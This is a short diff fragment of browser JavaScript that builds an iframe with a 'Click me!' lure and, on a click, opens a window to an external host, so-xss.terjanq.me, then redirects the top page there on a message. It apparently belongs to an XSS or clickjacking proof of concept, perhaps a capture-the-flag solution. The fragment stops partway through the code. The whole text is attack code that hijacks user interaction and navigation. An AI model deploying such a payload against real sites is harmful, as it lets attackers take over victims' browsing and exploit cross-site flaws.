@@ -8,7 +8,7 @@
     f.srcdoc = `
     <h1>Click me!</h1>
     <script>
-      document.onmousedown = e => {
+      onclick = e => {
         let w = open('https://so-xss.terjanq.me/iframe.php');
         onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
         setTimeout(_ => {
